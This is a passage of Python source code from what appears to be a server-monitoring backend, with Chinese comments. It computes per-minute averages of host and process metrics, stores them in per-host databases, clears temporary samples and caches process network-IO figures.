                .where('create_time < ?', save_time_line) \
                .delete()

            # 计算网卡IO平均信息
            cnt = db_tmp \
                .query() \
                .name('server_net_info_list') \
                .where('sid', sid) \
                .where('create_time >= ?', time_line) \
                .order('`sent_per_second` + `recv_per_second`', 'desc') \
                .group('name, sid') \
                .field('name', 'sid', 'count(*) as `cnt`') \
                .select()

            net_avg_info = []

            for item in cnt:
                if item['cnt'] == 0:
                    continue

                # offset = int(0.2 * item['cnt'])

                # sub_query = db_tmp \
                #     .query() \
                #     .name('server_net_info_list') \
                #     .where('sid=?', sid) \
                #     .where('name', item['name']) \
                #     .where('create_time>=?', time_line) \
                #     .order('`sent_per_second` + `recv_per_second`', 'desc') \
                #     .build_sql(True)

                # 获取最近的20个网卡IO样本
                samples_query = db_tmp \
                    .query() \
                    .name('server_net_info_list') \
                    .where('sid', sid) \
                    .where('name', item['name']) \
                    .where('create_time >= ?', time_line) \
                    .order('`sent_per_second` + `recv_per_second`', 'desc') \
                    .select()

                samples = list(samples_query)

                # 根据每分钟区间内的数据计算平均值
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                ssamples = self.get_average_minute(samples, 'sent_per_second')
                rsamples = self.get_average_minute(samples, 'recv_per_second')

                # 计算第一次均值
                sent_values = [s['sent_per_second'] for s in ssamples]
                recv_values = [s['recv_per_second'] for s in rsamples]

                if len(sent_values) == 0 or len(recv_values) == 0:
                    continue

                avg2_sent = self.get_average(sent_values)
                avg2_recv = self.get_average(recv_values)

                # # 将结果存储在`i_data`变量中
                # i_data = {
                #     'sid': item['sid'],
                #     'name': item['name'],
                #     'sent_per_second': round(avg2_sent),
                #     'recv_per_second': round(avg2_recv)
                # }
                #
                # if i_data is None or i_data['sid'] is None:
                #     continue
                #
                # net_avg_info.append(i_data)

                net_avg_info.append({
                    'sid': item['sid'],
                    'name': item['name'],
                    'sent_per_second': round(avg2_sent),
                    'recv_per_second': round(avg2_recv)
                })

            if len(net_avg_info) > 0:
                serv_net_insert_data = net_avg_info
                net_avg_info = None
                del (net_avg_info,)

            # 删除临时数据
            db_tmp.query() \
                .name('server_net_info_list') \
                .where('sid', sid) \
                .where('create_time < ?', save_time_line) \
                .delete()

            # sub_query = db_tmp \
            #     .query() \
            #     .name('server_loadavg_info_list') \
            #     .where('sid', sid) \
            #     .where('create_time >= ?', time_line) \
            #     .order('`last_1_min`+ `last_5_min` + `last_15_min`', 'DESC') \
            #     .build_sql(True)

            loadavg_samples_query = db_tmp \
                .query() \
                .name('server_loadavg_info_list') \
                .where('sid', sid) \
                .where('create_time >= ?', time_line) \
                .order('`last_1_min`+ `last_5_min` + `last_15_min`', 'DESC') \
                .select()

            loadavg_samples = list(loadavg_samples_query)
            # 根据每分钟区间内的数据计算平均值
            for i in loadavg_samples:
                i['time_slot'] = int(i['create_time'] / 60)

            loadavg_samples_1 = self.get_average_minute(loadavg_samples, 'last_1_min')
            loadavg_samples_5 = self.get_average_minute(loadavg_samples, 'last_5_min')
            loadavg_samples_15 = self.get_average_minute(loadavg_samples, 'last_15_min')

            # 计算第一次均值
            last_1_min_values = [s['last_1_min'] for s in loadavg_samples_1]
            last_5_min_values = [s['last_5_min'] for s in loadavg_samples_5]
            last_15_min_values = [s['last_15_min'] for s in loadavg_samples_15]
            avg2_last_1_min = self.get_average(last_1_min_values)
            avg2_last_5_min = self.get_average(last_5_min_values)
            avg2_last_15_min = self.get_average(last_15_min_values)

            if avg2_last_1_min + avg2_last_5_min + avg2_last_15_min > 0:
                serv_loadavg_insert_data = {
                    'sid': sid,
                    'last_1_min': round(avg2_last_1_min, 2),
                    'last_5_min': round(avg2_last_5_min, 2),
                    'last_15_min': round(avg2_last_15_min, 2)
                }

            # 删除临时数据
            db_tmp.query() \
                .name('server_loadavg_info_list') \
                .where('sid', sid) \
                .where('create_time < ?', save_time_line) \
                .delete()

        # 同步 进程数据---------------

        # 获取该主机10分钟内所有进程信息
        processes_memory = self.db_memory('processes') \
            .where('sid', int(sid)) \
            .where('update_time > ?', cur_time - 600) \
            .limit(500) \
            .select()

        process_id_list = [str(p['id']) for p in processes_memory]

        process_id_list_str = ','.join(process_id_list)

        # 清空十分钟前所有非活跃进程网络IO收集数据
        # 释放内存
        sub_sql = self.db_memory('processes') \
            .where('sid', sid) \
            .where('create_time <= ?', cur_time - 600) \
            .field('id') \
            .build_sql(True)

        self.db_memory('process_network_io_info_list') \
            .where('process_id IN ({})'.format(sub_sql)) \
            .delete()

        self.db_easy('processes').insert_all(processes_memory, option='replace', blocking=False)

        disk_insert_data = []

        # 进程CPU使用率收集批量插入数据
        cpu_insert_data = []

        # 进程内存占用信息收集批量插入数据
        mem_insert_data = []

        # 进程文件打开数收集批量插入数据
        opened_files_insert_data = []

        # 进程网络连接数收集批量插入数据
        opened_connections_insert_data = []

        # 进程线程数收集批量插入数据
        opened_threads_insert_data = []

        # 各状态进程数量收集批量插入数据
        # process_infos_insert_data = []

        # 进程网络IO
        net_insert_data = []

        # 打开临时数据库
        with self.__DB_MEMORY as db:
            # 计算进程磁盘IO平均信息
            cnt = db.query() \
                .name('process_disk_io_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time >= ?', time_line) \
                .group('process_id') \
                .field('process_id', 'count(*) as `cnt`') \
                .select()

            for item in cnt:
                if item['cnt'] == 0:
                    continue

                samples_query = db.query() \
                    .name('process_disk_io_info_list') \
                    .where('process_id', item['process_id']) \
                    .where('create_time >= ?', time_line) \
                    .order('`read_bytes_per_second` + `write_bytes_per_second`', 'DESC') \
                    .select()

                samples = list(samples_query)
                # 根据每分钟区间内的数据计算平均值
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                rsamples = self.get_average_minute(samples, 'read_bytes_per_second')
                wsamples = self.get_average_minute(samples, 'write_bytes_per_second')

                # 计算第一次均值
                read_values = [s['read_bytes_per_second'] for s in rsamples]
                write_values = [s['write_bytes_per_second'] for s in wsamples]
                avg2_read = self.get_average(read_values)
                avg2_write = self.get_average(write_values)

                i_data = {
                    'process_id': item['process_id'],
                    'read_bytes_per_second': round(avg2_read),
                    'write_bytes_per_second': round(avg2_write)
                }
                disk_insert_data.append(i_data)

            # 删除临时数据
            db.query() \
                .name('process_disk_io_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time<?', save_time_line_normal) \
                .delete()

            # 计算进程CPU使用率平均信息
            cnt = db.query() \
                .name('process_cpu_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time>=?', time_line) \
                .group('process_id') \
                .field('process_id', 'count(*) as `cnt`') \
                .select()

            for item in cnt:
                if item['cnt'] == 0:
                    continue
                # 获取最近的20个CPU使用率样本
                samples_query = db.query() \
                    .name('process_cpu_info_list') \
                    .where('process_id', item['process_id']) \
                    .where('create_time>=?', time_line) \
                    .order('percent', 'DESC') \
                    .select()

                samples = list(samples_query)
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                samples = self.get_average_minute(samples, 'percent')
                # 计算第一次均值
                values = [s['percent'] for s in samples]
                avg2 = self.get_average(values)

                # 将结果存储在`i_data`变量中
                i_data = {
                    'process_id': item['process_id'],
                    'percent': round(avg2, 2)
                }
                cpu_insert_data.append(i_data)

            # 删除临时数据
            db.query() \
                .name('process_cpu_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time<?', save_time_line_normal) \
                .delete()

            # 计算进程内存占用平均信息
            cnt = db.query() \
                .name('process_mem_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time>=?', time_line) \
                .group('process_id') \
                .field('process_id', 'count(*) as `cnt`') \
                .select()

            for item in cnt:
                if item['cnt'] == 0:
                    continue

                # sub_query = db.query() \
                #     .name('process_mem_info_list') \
                #     .where('process_id', item['process_id']) \
                #     .where('create_time>=?', time_line) \
                #     .order('`percent`', 'DESC') \
                #     .build_sql(True)

                # 获取最近的20个内存占用样本
                samples_query = db \
                    .query() \
                    .name('process_mem_info_list') \
                    .where('process_id', item['process_id']) \
                    .where('create_time>=?', time_line) \
                    .order('`percent`', 'DESC') \
                    .select()

                samples = list(samples_query)
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                psamples = self.get_average_minute(samples, 'percent')
                usamples = self.get_average_minute(samples, 'used')

                percent_values = [s['percent'] for s in psamples]
                used_values = [s['used'] for s in usamples]
                # 确保进程内存占用不会超过100
                avg2_percent = 95.9 if self.get_average(percent_values) >= 100 else self.get_average(percent_values)
                avg2_used = self.get_average(used_values)

                # 将结果存储在`i_data`变量中
                i_data = {
                    'process_id': item['process_id'],
                    'percent': round(avg2_percent, 2),
                    'used': round(avg2_used)
                }
                mem_insert_data.append(i_data)

            # 删除临时数据
            db.query() \
                .name('process_mem_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time<?', save_time_line) \
                .delete()

            # 计算进程文件打开数平均信息
            cnt = db.query() \
                .name('process_opened_files_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time>=?', time_line) \
                .group('process_id') \
                .field('process_id', 'count(*) as `cnt`') \
                .select()

            for item in cnt:
                if item['cnt'] == 0:
                    continue

                samples_query = db.query() \
                    .name('process_opened_files_info_list') \
                    .where('process_id', item['process_id']) \
                    .where('create_time>=?', time_line) \
                    .order('`opened_files`', 'DESC') \
                    .select()

                samples = list(samples_query)
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                samples = self.get_average_minute(samples, 'opened_files')
                # 计算第一次均值
                values = [s['opened_files'] for s in samples]
                avg2 = self.get_average(values)

                # 将结果存储在`i_data`变量中
                i_data = {
                    'process_id': item['process_id'],
                    'opened_files': round(avg2)
                }
                opened_files_insert_data.append(i_data)

            # 删除临时数据
            db.query() \
                .name('process_opened_files_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time < ?', save_time_line_normal) \
                .delete()

            cnt = db.query() \
                .name('process_opened_threads_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time >= ?', time_line) \
                .group('process_id') \
                .field('process_id', 'count(*) as `cnt`') \
                .select()

            # 计算进程线程数平均信息
            for item in cnt:
                if item['cnt'] == 0:
                    continue

                samples_query = db.query() \
                    .name('process_opened_threads_info_list') \
                    .where('process_id', item['process_id']) \
                    .where('create_time>=?', time_line) \
                    .order('opened_threads', 'DESC') \
                    .select()

                samples = list(samples_query)
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                samples = self.get_average_minute(samples, 'opened_threads')

                # 计算第一次均值
                values = [s['opened_threads'] for s in samples]
                avg2 = self.get_average(values)

                # 将结果存储在`i_data`变量中
                i_data = {
                    'process_id': item['process_id'],
                    'opened_threads': round(avg2)
                }

                opened_threads_insert_data.append(i_data)

            # 删除临时数据
            db.query() \
                .name('process_opened_threads_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time<?', save_time_line_normal) \
                .delete()

            # 计算进程网络IO信息
            cnt = db \
                .query() \
                .name('process_network_io_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time >= ?', time_line) \
                .group('process_id') \
                .field('process_id', 'count(*) as `cnt`') \
                .select()

            for item in cnt:
                if item['cnt'] == 0:
                    continue

                # offset = int(0.2 * item['cnt'])

                # sub_query = db \
                #     .query() \
                #     .name('process_network_io_info_list') \
                #     .where('process_id', item['process_id']) \
                #     .where('create_time>=?', time_line) \
                #     .order('`sent_bytes_per_second` + `recv_bytes_per_second`', 'desc') \
                #     .build_sql(True)

                # # 计算进程网络IO平均数据
                # i_data = db.query() \
                #     .from_sub_query(sub_query) \
                #     .field('process_id', 'round(avg(`sent_bytes_per_second`)) as `sent_bytes_per_second`',
                #            'round(avg(`recv_bytes_per_second`)) as `recv_bytes_per_second`') \
                #     .find()

                # 获取最近的20个网络IO样本
                samples_query = db.query() \
                    .name('process_network_io_info_list') \
                    .where('process_id', item['process_id']) \
                    .where('create_time >= ?', time_line) \
                    .order('`sent_bytes_per_second` + `recv_bytes_per_second`', 'desc') \
                    .select()

                samples = list(samples_query)

                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                ssamples = self.get_average_minute(samples, 'sent_bytes_per_second')
                rsamples = self.get_average_minute(samples, 'recv_bytes_per_second')

                # 计算第一次均值
                sent_values = [s['sent_bytes_per_second'] for s in ssamples]
                recv_values = [s['recv_bytes_per_second'] for s in rsamples]
                avg2_sent = self.get_average(sent_values)
                avg2_recv = self.get_average(recv_values)

                # avg1_sent = sum(sent_values) / 20
                # avg1_recv = sum(recv_values) / 20
                #
                # # 计算第二次均值
                # sent_values_above_avg1 = [v for v in sent_values if v >= avg1_sent]
                # recv_values_above_avg1 = [v for v in recv_values if v >= avg1_recv]
                # avg2_sent = sum(sent_values_above_avg1) / len(
                #     sent_values_above_avg1) if sent_values_above_avg1 else avg1_sent
                # avg2_recv = sum(recv_values_above_avg1) / len(
                #     recv_values_above_avg1) if recv_values_above_avg1 else avg1_recv

                # 将结果存储在`i_data`变量中
                i_data = {
                    'process_id': item['process_id'],
                    'sent_bytes_per_second': round(avg2_sent),
                    'recv_bytes_per_second': round(avg2_recv)
                }

                if i_data is None or i_data['process_id'] is None:
                    continue
                net_insert_data.append(i_data)

            # 删除临时数据
            db.query() \
                .name('process_network_io_info_list') \
                .where('process_id IN ({})'.format(process_id_list_str)) \
                .where('create_time < ?', save_time_line) \
                .delete()

        # public.print_log('>>>> insert_insert_data: {} >> inserting'.format(sid), _level='error')

        # 获取数据库管理对象
        db_mgr = monitor_db_manager.MonitorDbManager(sid)

        # 将主机基础监控数据写入磁盘
        # 写入数据
        if serv_cpu_insert_data is not None:
            # public.print_log('>>>> insert_serv_cpu_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('server_cpu_info_list', serv_cpu_insert_data, option='ignore')

        if serv_mem_insert_data is not None:
            # public.print_log('>>>> insert_serv_mem_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('server_mem_info_list', serv_mem_insert_data, option='ignore')

        if serv_swap_insert_data is not None:
            # public.print_log('>>>> insert_serv_swap_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('server_swap_info_list', serv_swap_insert_data, option='ignore')

        if serv_disk_insert_data is not None:
            # public.print_log('>>>> insert_serv_disk_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('server_disk_info_list', serv_disk_insert_data, option='ignore')

        if serv_net_insert_data is not None:
            # public.print_log('>>>> insert_serv_net_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('server_net_info_list', serv_net_insert_data, option='ignore')

        if serv_loadavg_insert_data is not None:
            # public.print_log('>>>> insert_serv_loadavg_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('server_loadavg_info_list', serv_loadavg_insert_data, option='ignore')

        # 写入进程IO收集数据
        if len(disk_insert_data) > 0:
            # public.print_log('>>>> insert_disk_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('process_disk_io_info_list', disk_insert_data, option='ignore')

        # 写入CPU使用率收集数据
        if len(cpu_insert_data) > 0:
            # public.print_log('>>>> insert_cpu_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('process_cpu_info_list', cpu_insert_data, option='ignore')

        # 写入内存占用收集数据
        if len(mem_insert_data) > 0:
            # public.print_log('>>>> insert_mem_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('process_mem_info_list', mem_insert_data, option='ignore')

        # 写入文件打开数收集数据
        if len(opened_files_insert_data) > 0:
            # public.print_log('>>>> insert_opened_files_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('process_opened_files_info_list', opened_files_insert_data, option='ignore')

        # # 写入网络连接数收集数据
        # if len(opened_connections_insert_data) > 0:
        #     db_mgr.add('process_opened_connections_info_list', opened_connections_insert_data)

        # 写入线程数收集数据
        if len(opened_threads_insert_data) > 0:
            # public.print_log('>>>> insert_opened_threads_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('process_opened_threads_info_list', opened_threads_insert_data, option='ignore')

        # 写入进程网络IO数据
        if len(net_insert_data) > 0:
            # public.print_log('>>>> insert_net_insert_data: {}'.format(sid), _level='error')
            db_mgr.add('process_network_io_info_list', net_insert_data, option='ignore')

        # public.print_log('>>>> insert_data: {} >> ok'.format(sid), _level='error')

        # 回收内存
        del (serv_cpu_insert_data,
             serv_mem_insert_data,
             serv_swap_insert_data,
             serv_disk_insert_data,
             serv_net_insert_data,
             serv_loadavg_insert_data,
             disk_insert_data,
             cpu_insert_data,
             mem_insert_data,
             opened_files_insert_data,
             opened_connections_insert_data)

    def update_process_network_io_info(self, sid, process_network_info_list):
        '''
            @name 将进程网络信息写入数据库
            @author Zhj<2022-07-04>
            @param  sid<integer>                    主机ID
            @param  process_network_info_list<dict> 进程网络信息列表
            @return bool
        '''
        # 检查主机是否在线
        # 检查磁盘空间占用是否过高
        # if not self.server_is_online(sid) or self.running_dir_used_percent_high():
        if self.running_dir_used_percent_high():
            return False

        if isinstance(process_network_info_list, str):
            try:
                process_network_info_list = json.loads(process_network_info_list)
            except:
                return False

        ret_flag = True

        # 获取当前时间
        cur_time = int(time.time())

        # 进程网络IO收集插入数据
        net_insert_data = []

        # 已处理的进程ID列表
        handled_process_ids = []

        # 进程名称与启动路径
        pne_insert_data = []

        # 是否开启了数据采样
        sampling_opened = self.sampling_global(sid, monitor_enums.SAMPLING_GLOBAL__PROCESS)

        # 匹配已被kill掉的进程
        # skip_boot_command_pattern = re.compile(r'\(deleted\)$')

        # 更新进程网络IO信息
        try:
            # 将最近10分钟的进程列表写入内存
            if sid not in self.__PROCESS_LIST_STORED_IN_MEMORY:
                with Locker.acquire(self.__STORE_PROCESS_LOCK, timeout=5):
                    for _ in range(1):
                        if sid in self.__PROCESS_LIST_STORED_IN_MEMORY:
                            break

                        if self.db_easy('processes') \
                                .where('sid=?', sid) \
                                .where('update_time > ?', cur_time - 600) \
                                .field('id') \
                                .exists():
                            processes = self.db_easy('processes') \
                                .where('sid = ?', sid) \
                                .where('update_time > ?', cur_time - 600) \
                                .field('id', 'sid', 'pne_id', 'status', 'boot_time', 'boot_user', 'opened_files',
                                       'opened_connections', 'opened_threads', 'net_sent_bytes_per_second',
                                       'disk_read_bytes', 'disk_write_bytes', 'disk_read_bytes_per_second',
                                       'disk_write_bytes_per_second', 'net_sent_bytes', 'net_recv_bytes',
                                       'net_recv_bytes_per_second',
                                       'cpu_used_percent', 'mem_used_percent', 'create_time', 'update_time') \
                                .select()

                            self.db_memory('processes').insert_all(processes, option='ignore', blocking=True)

                        # 标记该主机进程列表已加载进内存中
                        self.__PROCESS_LIST_STORED_IN_MEMORY.add(sid)

                        break

            data = []
            for k, v in process_network_info_list.items():
                if int(v['total_up']) + int(v['total_down']) < 1:
                    continue

                v['key'] = k
                v['total_up'] = int(v['total_up'])
                v['total_down'] = int(v['total_down'])
                data.append(v)

            new_data = data

            # 当主机进程数超过30个时，排序取前50个
            if len(data) > 30:
                new_data = sorted(data, key=lambda i: (i['total_up'] + i['total_down'],), reverse=True)[:50]

            # with self.acquire('STORING_PROCESS_NETWORK_DATA__{}'.format(sid)):
            for process_network_info in new_data:
                process_name, boot_command = process_network_info['key'].split('|', 1)

                pne_id = self.get_pne_id(process_name, boot_command)

                pne_insert_data.append({
                    'id': pne_id,
                    'name': process_name,
                    'exe': boot_command,
                })

                # if skip_boot_command_pattern.search(boot_command):
                #     continue

                update_data = {
                    'pne_id': pne_id,
                    # 'name': process_name,
                    # 'boot_command': boot_command,
                    'net_sent_bytes': int(process_network_info['total_up']),
                    'net_recv_bytes': int(process_network_info['total_down']),
                    'update_time': cur_time,
                }

                # 查询进程ID
                process_info_cache_key = '{}|{}|{}'.format(sid, process_name, boot_command)

                res = None

                # 优先从内存中获取
                if process_info_cache_key in self.__CACHED_PROCESSES:
                    res, _ = self.__CACHED_PROCESSES[process_info_cache_key]

                # 其次从数据库获取
                else:
                    # 从数据库中查询并写入内存
                    with Locker.acquire(self.__UPDATE_CACHED_PROCESSES_LOCK, timeout=5):
                        for _ in range(1):
                            if process_info_cache_key in self.__CACHED_PROCESSES:
                                res, _ = self.__CACHED_PROCESSES[process_info_cache_key]
                                break

                            res = self.db_memory('processes') \
                                .where('sid', sid) \
                                .where('pne_id', pne_id) \
                                .field('id', 'boot_time') \
                                .find()

                            if res is None:
                                break

                            self.__CACHED_PROCESSES[process_info_cache_key] = (res, cur_time)
                            break

                process_id = 0 if self.is_empty_result(res) else int(res['id'])
                boot_time = 0 if self.is_empty_result(res) else int(res['boot_time'])

                net_info = {
                    'sent_bytes_per_second': int(process_network_info['up']),
                    'recv_bytes_per_second': int(process_network_info['down']),
                }

                # last_net_info = db.query()\
                #     .name('process_network_io_info_list')\
                #     .where('`process_id` = ?', process_id)\
                #     .where('`create_time` >= ?', boot_time)\
                #     .field(
                #         'sent_bytes_per_second',
                #         'recv_bytes_per_second',
                #         'create_time'
                #     )\
                #     .order('create_time', 'desc')\
                #     .find()

                # 获取上一次进程网络信息
                last_net_info, _ = self.__CACHED_PROCESS_NET.get(process_id, (None, None))

                # 是否需要重置网络IO总数
                reset_net_info = self.is_empty_result(last_net_info)

                if not self.is_empty_result(last_net_info) and int(last_net_info['create_time']) >= boot_time:
                    time_diff = cur_time - int(last_net_info['create_time'])

                    if time_diff < 1:
                        net_info['sent_bytes_per_second'] = last_net_info['sent_bytes_per_second']
                        net_info['recv_bytes_per_second'] = last_net_info['recv_bytes_per_second']
                    else:
                        net_info['sent_bytes_per_second'] = round(update_data['net_sent_bytes'] / time_diff)
                        net_info['recv_bytes_per_second'] = round(update_data['net_recv_bytes'] / time_diff)

                if self.is_empty_result(res):
                    update_data['sid'] = int(sid)
                    process_id = self.db_memory('processes') \
                        .insert(update_data)
                else:
                    # self.db_memory().execute('''
                    #     UPDATE `bt_processes`
                    #     SET `name` = '{name}',
                    #         `boot_command` = '{boot_command}',
                    #         `net_sent_bytes` = CASE WHEN {reset_net_info} THEN 0 ELSE `net_sent_bytes` END + {net_sent_bytes},
                    #         `net_recv_bytes` = CASE WHEN {reset_net_info} THEN 0 ELSE `net_recv_bytes` END + {net_recv_bytes},
                    #         `net_sent_bytes_per_second` = {net_sent_bytes_per_second},
                    #         `net_recv_bytes_per_second` = {net_recv_bytes_per_second},
                    #         `update_time` = {update_time}
                    #     WHERE `id` = ?
                    # '''.format(
                    #     name=process_name,
                    #     boot_command=boot_command,
                    #     net_sent_bytes=int(process_network_info['total_up']),
                    #     net_recv_bytes=int(process_network_info['total_down']),
                    #     net_sent_bytes_per_second=int(net_info['sent_bytes_per_second']),
                    #     net_recv_bytes_per_second=int(net_info['recv_bytes_per_second']),
                    #     update_time=cur_time,
                    #     reset_net_info=1 if reset_net_info else 0
                    # ), process_id)

                    self.db_memory('processes') \
                        .where('id', process_id) \
                        .exp('net_sent_bytes',
                             'CASE WHEN {} THEN 0 ELSE `net_sent_bytes` END + {}'.format(1 if reset_net_info else 0,
                                                                                         int(process_network_info[
                                                                                                 'total_up']))) \
                        .exp('net_recv_bytes',
                             'CASE WHEN {} THEN 0 ELSE `net_recv_bytes` END + {}'.format(1 if reset_net_info else 0,
                                                                                         int(process_network_info[
                                                                                                 'total_down']))) \
                        .update({
                            'pne_id': pne_id,
                            'net_sent_bytes_per_second': int(net_info['sent_bytes_per_second']),
                            'net_recv_bytes_per_second': int(net_info['recv_bytes_per_second']),
                            'update_time': cur_time,
                        }, blocking=False)

                if process_id == 0:
                    continue

                # 将进程信息缓存更新到内存中
                if process_info_cache_key not in self.__CACHED_PROCESSES:
                    with Locker.acquire(self.__UPDATE_CACHED_PROCESSES_LOCK, timeout=5):
                        if process_info_cache_key not in self.__CACHED_PROCESSES:
                            self.__CACHED_PROCESSES[process_info_cache_key] = ({
                                   'id': process_id,
                                   'boot_time': cur_time,
                               }, cur_time + 120)

                # 将进程网络信息更新到内存中
                with Locker.acquire(self.__UPDATE_CACHED_PROCESS_NET_LOCK, timeout=5):
                    self.__CACHED_PROCESS_NET[process_id] = ({
                                                                 'sent_bytes_per_second': int(
                                                                     net_info['sent_bytes_per_second']),
                                                                 'recv_bytes_per_second': int(
                                                                     net_info['recv_bytes_per_second']),
                                                                 'create_time': cur_time,
                                                             }, cur_time)

                # 收集进程网络信息
                if int(net_info['sent_bytes_per_second']) + int(net_info['recv_bytes_per_second']) > 0\
                        and sampling_opened \
                        and not self.sampling_closed('global', process_id=process_id) \
                        and not self.sampling_closed('net_io', process_id=process_id):
                    net_insert_data.append({
                        'process_id': process_id,
                        'sent_bytes_per_second': int(net_info['sent_bytes_per_second']),
                        'recv_bytes_per_second': int(net_info['recv_bytes_per_second']),
                    })

                # 将进程实时网络信息写入缓存
                # public.print_log("set cache network io:")
                # public.print_log(int(net_info['sent_bytes_per_second']), int(net_info['recv_bytes_per_second']))
                self.cache_realtime_proc_info(
                    process_id=process_id,
                    net_sent_per_second=int(net_info['sent_bytes_per_second']),
                    net_recv_per_second=int(net_info['recv_bytes_per_second'])
                )

                # 记录已处理的进程ID
                handled_process_ids.append(process_id)

            # 更新未推送过来的进程网络即时IO
            # 仅更新最近10分钟的数据
            self.db_memory('processes') \
                .where('sid', int(sid)) \
                .where_not_in('id', handled_process_ids) \
                .where('update_time > ?', cur_time - 600) \
                .update({
                    'net_sent_bytes_per_second': 0,
                    'net_recv_bytes_per_second': 0,
                }, blocking=False)
        except BaseException as e:
            # 记录异常堆栈
            public.print_exc_stack(e)

            return False

        # 更新进程名称与启动路径
        self.__PROCESS_NAME_EXE_QUEUE.put_nowait(pne_insert_data)
        # self.db_easy('process_name_exe') \
        #         .insert_all(pne_insert_data, option='replace', blocking=False)

        # 写入临时数据
        with self.__DB_MEMORY as db:
            # 批量插入进程网络IO收集信息
            if len(net_insert_data) > 0:
                db.query() \
                    .name('process_network_io_info_list') \
                    .insert_all(net_insert_data, blocking=False)

        # # 按磁盘写入间隔写入数据
        # time_line = cur_time - (self.__DISK_WRITE_PER_MINUTES * 60)
        # save_time_line = cur_time - 240
        # last_store_time = self.__PROCESS_NETWORK_IO_LAST_STORE_TIME.get(sid, 0)
        # if last_store_time == 0:
        #     self.__PROCESS_NETWORK_IO_LAST_STORE_TIME[sid] = cur_time
        # if self.__PROCESS_NETWORK_IO_LAST_STORE_TIME.get(sid, 0) < time_line:
        #     # 记录本次进程信息存储时间
        #     self.__PROCESS_NETWORK_IO_LAST_STORE_TIME[sid] = cur_time
        #
        #     # 获取该主机10分钟内所有进程信息
        #     processes_memory = self.db_memory('processes') \
        #         .where('sid', int(sid)) \
        #         .where('update_time > ?', cur_time - 600) \
        #         .select()
        #
        #     process_id_list = [str(p['id']) for p in processes_memory]
        #
        #     process_id_list_str = ','.join(process_id_list)
        #
        #     # 清空十分钟前所有非活跃进程网络IO收集数据
        #     # 释放内存
        #     sub_sql = self.db_memory('processes') \
        #         .where('sid', sid) \
        #         .where('create_time <= ?', cur_time - 600) \
        #         .field('id') \
        #         .build_sql(True)
        #
        #     self.db_memory('process_network_io_info_list') \
        #         .where('process_id IN ({})'.format(sub_sql)) \
        #         .delete()
        #
        #     self.db_easy('processes').insert_all(processes_memory, option='replace', blocking=False)
        #
        #     net_insert_data = []
        #
        #     with self.__DB_MEMORY as db:
        #         # 计算进程网络IO信息
        #         cnt = db \
        #             .query() \
        #             .name('process_network_io_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time>=?', time_line) \
        #             .group('process_id') \
        #             .field('process_id', 'count(*) as `cnt`')\
        #             .select()
        #
        #         for item in cnt:
        #             if item['cnt'] == 0:
        #                 continue
        #
        #             # offset = int(0.2 * item['cnt'])
        #
        #             sub_query = db \
        #                 .query() \
        #                 .name('process_network_io_info_list') \
        #                 .where('process_id', item['process_id']) \
        #                 .where('create_time>=?', time_line) \
        #                 .order('`sent_bytes_per_second` + `recv_bytes_per_second`', 'desc')\
        #                 .build_sql(True)
        #
        #             # # 计算进程网络IO平均数据
        #             # i_data = db.query() \
        #             #     .from_sub_query(sub_query) \
        #             #     .field('process_id', 'round(avg(`sent_bytes_per_second`)) as `sent_bytes_per_second`',
        #             #            'round(avg(`recv_bytes_per_second`)) as `recv_bytes_per_second`') \
        #             #     .find()
        #
        #             # 获取最近的20个网络IO样本
        #             samples_query = db.query() \
        #                 .from_sub_query(sub_query) \
        #                 .select()
        #
        #             samples = list(samples_query)
        #
        #             for i in samples:
        #                 i['time_slot'] = int(i['create_time'] / 60)
        #
        #             ssamples = self.get_average_minute(samples, 'sent_bytes_per_second')
        #             rsamples = self.get_average_minute(samples, 'recv_bytes_per_second')
        #
        #             # 计算第一次均值
        #             sent_values = [s['sent_bytes_per_second'] for s in ssamples]
        #             recv_values = [s['recv_bytes_per_second'] for s in rsamples]
        #             avg2_sent = self.get_average(sent_values)
        #             avg2_recv = self.get_average(recv_values)
        #
        #             # avg1_sent = sum(sent_values) / 20
        #             # avg1_recv = sum(recv_values) / 20
        #             #
        #             # # 计算第二次均值
        #             # sent_values_above_avg1 = [v for v in sent_values if v >= avg1_sent]
        #             # recv_values_above_avg1 = [v for v in recv_values if v >= avg1_recv]
        #             # avg2_sent = sum(sent_values_above_avg1) / len(
        #             #     sent_values_above_avg1) if sent_values_above_avg1 else avg1_sent
        #             # avg2_recv = sum(recv_values_above_avg1) / len(
        #             #     recv_values_above_avg1) if recv_values_above_avg1 else avg1_recv
        #
        #             # 将结果存储在`i_data`变量中
        #             i_data = {
        #                 'process_id': item['process_id'],
        #                 'sent_bytes_per_second': round(avg2_sent),
        #                 'recv_bytes_per_second': round(avg2_recv)
        #             }
        #
        #             if i_data is None or i_data['process_id'] is None:
        #                 continue
        #             net_insert_data.append(i_data)
        #
        #         # 删除临时数据
        #         db.query() \
